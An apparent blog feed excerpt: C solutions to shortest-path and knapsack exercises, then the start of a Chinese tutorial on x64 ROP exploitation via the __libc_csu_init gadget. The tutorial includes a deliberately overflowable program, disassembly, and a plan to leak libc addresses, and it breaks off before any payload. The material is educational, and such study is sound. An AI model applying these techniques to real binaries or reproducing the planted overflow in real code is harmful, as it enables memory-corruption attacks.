class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> cost[MAXN+<span class="number">2</span>][MAXN+<span class="number">2</span>]; <span class="comment">//  保存 图 （各权值）</span></div><div class="line"><span class="keyword">int</span> n; <span class="comment">// 顶点数</span></div><div class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">// 从初始点出发 的最短距离</span></div><div class="line"><span class="keyword">bool</span> used[MAXN]; <span class="comment">// 已经使用过的图</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        d[i] = INF;</div><div class="line">    <span class="built_in">memset</span>(used, <span class="literal">false</span>, <span class="keyword">sizeof</span>(<span class="keyword">bool</span>) * (n+<span class="number">1</span>));</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line">        <span class="keyword">int</span> u;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || d[u] &lt; d[v]))</div><div class="line">                v = u;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (v == <span class="number">-1</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            d[u] = min( d[u], d[v] + cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[n]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a&gt;b?b:a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1078"><a href="#1078" class="headerlink" title="1078"></a>1078</h2><h3 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h3><p>任意两点间的最短路径问题的变体吧。一旦找出了从某个源点（人）到其他所有人需要的层数时，记录下来，如果有的人与其他所有人都不认识，则该层数是 无穷大（INF）。之后通过循环，找出从每个源点出发所需要的层数，并取最大值。要注意的是 算法求得最短路径 是 经过了几条路径（路径权为 1 ，路径权和即有几条路径），而题目的 层数M 是指 两个人之间还有多少人，即经过了多少个 点， 所以在最后的结果中记得减一。</p>
<h3 id="提交-15"><a href="#提交-15" class="headerlink" title="提交"></a>提交</h3><h4 id="dijkstra算法"><a href="#dijkstra算法" class="headerlink" title="dijkstra算法"></a>dijkstra算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> cost[MAXN+<span class="number">2</span>][MAXN+<span class="number">2</span>]; <span class="comment">//  保存 图 （各权值）</span></div><div class="line"><span class="keyword">int</span> n; <span class="comment">// 顶点数</span></div><div class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">// 从初始点出发 的最短距离</span></div><div class="line"><span class="keyword">bool</span> used[MAXN]; <span class="comment">// 已经使用过的图</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        d[i] = INF;</div><div class="line">    <span class="built_in">memset</span>(used, <span class="literal">false</span>, <span class="keyword">sizeof</span>(<span class="keyword">bool</span>) * (n+<span class="number">1</span>));</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line">        <span class="keyword">int</span> u;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || d[u] &lt; d[v]))</div><div class="line">                v = u;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (v == <span class="number">-1</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            d[u] = min( d[u], d[v] + cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[n]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a&gt;b?b:a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Floyd-Warshall-算法"><a href="#Floyd-Warshall-算法" class="headerlink" title="Floyd-Warshall 算法"></a>Floyd-Warshall 算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 102</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"><span class="keyword">int</span> G[MAX][MAX];</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">warshall_floyd</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">int</span> M = <span class="number">0</span>;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)&#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G[i][j]);</div><div class="line">            <span class="keyword">if</span> ( G[i][j] == <span class="number">0</span>)</div><div class="line">                G[i][j] = INF;</div><div class="line">            <span class="keyword">if</span>  ( i == j )</div><div class="line">                G[i][j] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line"></div><div class="line">    warshall_floyd();</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            M = max(M, G[i][j]);</div><div class="line">    <span class="keyword">if</span> ( M  == INF)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,<span class="number">-1</span>);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, M<span class="number">-1</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">warshall_floyd</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> k, i, j;</div><div class="line">    <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= n; k++)</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">            <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">                G[i][j] = min(G[i][j], G[i][k] + G[k][j]);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a &gt; b ? b : a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a &gt; b ? a : b;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1316"><a href="#1316" class="headerlink" title="1316"></a>1316</h2><h3 id="想法-4"><a href="#想法-4" class="headerlink" title="想法"></a>想法</h3><p>贪心算法。背包问题。有别于0/1背包问题。<br>每次选取尽量多的单位价值高的物体。</p>
<h3 id="提交-16"><a href="#提交-16" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> unit&#123;</div><div class="line">    <span class="keyword">double</span> unitValue;</div><div class="line">    <span class="keyword">int</span> id;</div><div class="line">    <span class="keyword">double</span> weight;</div><div class="line">    <span class="keyword">double</span> value;</div><div class="line">&#125;unit;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(unit s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">double</span> m,n;</div><div class="line">    <span class="keyword">static</span> unit valuesor[<span class="number">100010</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;m,&amp;n);</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;valuesor[i].weight,&amp;valuesor[i].value);</div><div class="line">        valuesor[i].unitValue = (<span class="keyword">double</span>)valuesor[i].value / (<span class="keyword">double</span>)valuesor[i].weight;</div><div class="line">        valuesor[i].id = i;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    quick_sort(valuesor,<span class="number">1</span>,n);</div><div class="line"></div><div class="line">    <span class="keyword">double</span> remainSpace = m;</div><div class="line">    <span class="keyword">double</span> allValue = <span class="number">0</span>;</div><div class="line">    i = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n ; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (remainSpace &lt;= <span class="number">0</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">if</span> (valuesor[i].weight &lt;= remainSpace)&#123;</div><div class="line">            remainSpace = remainSpace - valuesor[i].weight;</div><div class="line">            allValue += valuesor[i].value;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            allValue += remainSpace *valuesor[i].unitValue;</div><div class="line">            remainSpace = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%lf\n"</span>,allValue);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(unit s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l &lt; r)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span> i = l, j = r;</div><div class="line">        unit x = s[l];</div><div class="line"></div><div class="line">        <span class="keyword">while</span> (i &lt; j)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[j].unitValue &lt;= x.unitValue)</div><div class="line">                j--;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                s[i].unitValue = s[j].unitValue;</div><div class="line">                s[i].id = s[j].id;</div><div class="line">                s[i].value = s[j].value;</div><div class="line">                s[i].weight = s[j].weight;</div><div class="line">                i++;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[i].unitValue &gt;= x.unitValue)</div><div class="line">                i++;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                s[j].unitValue = s[i].unitValue;</div><div class="line">                s[j].id = s[i].id;</div><div class="line">                s[j].value = s[i].value;</div><div class="line">                s[j].weight = s[i].weight;</div><div class="line">                j--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        s[i].id = x.id;</div><div class="line">        s[i].unitValue = x.unitValue;</div><div class="line">        s[i].value = x.value;</div><div class="line">        s[i].weight = x.weight;</div><div class="line">        quick_sort(s, l, i - <span class="number">1</span>);</div><div class="line">        quick_sort(s, i + <span class="number">1</span>, r);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近更新日期：2017-06-21&lt;br&gt;干脆把自己平日做的题放在一篇文章里吧。不然太分散了。&lt;br&gt;POJ: 1163 1258 1273 1979 2387 2388 3069 3176 3253 3617&lt;br&gt;XOJ: 1004 1005 1022 1061 1062 1075 1078 1316&lt;br&gt;
    
    </summary>
    
      <category term="编程练习" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="编程练习" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>ROP学习：利用通用gadget</title>
    <link href="http://yoursite.com/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/"/>
    <id>http://yoursite.com/2017/08/09/ROP学习：利用通用gadget/</id>
    <published>2017-08-09T11:19:20.000Z</published>
    <updated>2017-08-09T16:56:29.845Z</updated>
    
    <content type="html"><![CDATA[<p>web狗的二进制之路。<br><a id="more"></a></p>
<h1 id="通用Gadget"><a href="#通用Gadget" class="headerlink" title="通用Gadget"></a>通用Gadget</h1><p>在x64下进行pwn时，由于参数的传递是通过寄存器来传递的，所以需要寻找gadget。有时用一些工具比如ROPgadget，使用下面的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROPgadget ---binary bin --only &quot;pop|ret&quot;</div></pre></td></tr></table></figure></p>
<p>来寻找gadget。但有时候找不到可用的gadget。</p>
<p>但在x64的环境下，程序有调用libc.so的话，一般会有一个__libc_csu_init()函数。利用里面的gadget可以达到向函数进行传参的功能。这就是通用gadget。</p>
<p>以蒸米师傅的<a href="http://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.11b0b6ciOa8Kp&amp;articleid=473" target="_blank" rel="external">《一步一步学ROP之linux_x64篇》</a>为例研究一下。其源代码level5.c如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</div><div class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</div><div class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</div><div class="line">    vulnerable_function();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>用objdump查看，习惯intel语法了所以这里加了个 <code>-Mintel</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -d -Mintel level5</div></pre></td></tr></table></figure></p>
<p>其中__libc_csu_init函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">00000000004005a0 &lt;__libc_csu_init&gt;:</div><div class="line">  4005a0:	48 89 6c 24 d8       	mov    QWORD PTR [rsp-0x28],rbp</div><div class="line">  4005a5:	4c 89 64 24 e0       	mov    QWORD PTR [rsp-0x20],r12</div><div class="line">  4005aa:	48 8d 2d 73 08 20 00 	lea    rbp,[rip+0x200873]        # 600e24 &lt;__init_array_end&gt;</div><div class="line">  4005b1:	4c 8d 25 6c 08 20 00 	lea    r12,[rip+0x20086c]        # 600e24 &lt;__init_array_end&gt;</div><div class="line">  4005b8:	4c 89 6c 24 e8       	mov    QWORD PTR [rsp-0x18],r13</div><div class="line">  4005bd:	4c 89 74 24 f0       	mov    QWORD PTR [rsp-0x10],r14</div><div class="line">  4005c2:	4c 89 7c 24 f8       	mov    QWORD PTR [rsp-0x8],r15</div><div class="line">  4005c7:	48 89 5c 24 d0       	mov    QWORD PTR [rsp-0x30],rbx</div><div class="line">  4005cc:	48 83 ec 38          	sub    rsp,0x38</div><div class="line">  4005d0:	4c 29 e5             	sub    rbp,r12</div><div class="line">  4005d3:	41 89 fd             	mov    r13d,edi</div><div class="line">  4005d6:	49 89 f6             	mov    r14,rsi</div><div class="line">  4005d9:	48 c1 fd 03          	sar    rbp,0x3</div><div class="line">  4005dd:	49 89 d7             	mov    r15,rdx</div><div class="line">  4005e0:	e8 1b fe ff ff       	call   400400 &lt;_init&gt;</div><div class="line">  4005e5:	48 85 ed             	test   rbp,rbp</div><div class="line">  4005e8:	74 1c                	je     400606 &lt;__libc_csu_init+0x66&gt;</div><div class="line">  4005ea:	31 db                	xor    ebx,ebx</div><div class="line">  4005ec:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]</div><div class="line">  4005f0:	4c 89 fa             	mov    rdx,r15</div><div class="line">  4005f3:	4c 89 f6             	mov    rsi,r14</div><div class="line">  4005f6:	44 89 ef             	mov    edi,r13d</div><div class="line">  4005f9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]</div><div class="line">  4005fd:	48 83 c3 01          	add    rbx,0x1</div><div class="line">  400601:	48 39 eb             	cmp    rbx,rbp</div><div class="line">  400604:	75 ea                	jne    4005f0 &lt;__libc_csu_init+0x50&gt;</div><div class="line">  400606:	48 8b 5c 24 08       	mov    rbx,QWORD PTR [rsp+0x8]</div><div class="line">  40060b:	48 8b 6c 24 10       	mov    rbp,QWORD PTR [rsp+0x10]</div><div class="line">  400610:	4c 8b 64 24 18       	mov    r12,QWORD PTR [rsp+0x18]</div><div class="line">  400615:	4c 8b 6c 24 20       	mov    r13,QWORD PTR [rsp+0x20]</div><div class="line">  40061a:	4c 8b 74 24 28       	mov    r14,QWORD PTR [rsp+0x28]</div><div class="line">  40061f:	4c 8b 7c 24 30       	mov    r15,QWORD PTR [rsp+0x30]</div><div class="line">  400624:	48 83 c4 38          	add    rsp,0x38</div><div class="line">  400628:	c3                   	ret    </div><div class="line">  400629:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]</div></pre></td></tr></table></figure></p>
<p>在<a href="http://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.11b0b6ciOa8Kp&amp;articleid=473" target="_blank" rel="external">《一步一步学ROP之linux_x64篇》</a>中，利用该通用gadget的思路如下：</p>
<blockquote>
<p>我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx<em>8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx</em>8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。</p>
</blockquote>
<p>不过具体是怎样的一个流程，可能光看这段话不太清楚。我们根据蒸米师傅的payload1来调试一下整个ROP的过程。</p>
<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>蒸米师傅的第一个payload，是要利用write()输出在内存中的地址，即<code>write(1, write.got, 8)</code>。根据64位由寄存器传参，我们要利用rop做到以下几件事：</p>
<ul>
<li>设置<code>rdi</code>为<code>1</code>，这是第一个参数</li>
<li>设置<code>rsi</code>为 write的got地址即write.got，这是第二个参数</li>
<li>设置<code>rdx</code>为 8，这是第三个参数</li>
